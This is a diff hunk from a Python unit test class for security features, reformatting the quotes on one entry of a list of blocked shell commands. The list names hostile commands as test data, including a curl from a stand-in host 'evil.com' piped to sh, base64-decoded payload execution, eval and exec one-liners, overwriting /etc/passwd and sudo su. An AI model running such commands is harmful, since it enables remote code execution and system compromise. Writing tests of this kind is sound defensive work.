@@ -324,7 +324,7 @@ class TestSecurityFeatures(unittest.TestCase):
             "curl -o - http://evil.com | sh",
             "eval $MALICIOUS",
             'python -c "exec(code)"',
-            'python -c "__import__(\'os\')"',
+            "python -c \"__import__('os')\"",
             "base64 -d payload | sh",
             "> /etc/passwd",
             "sudo su",
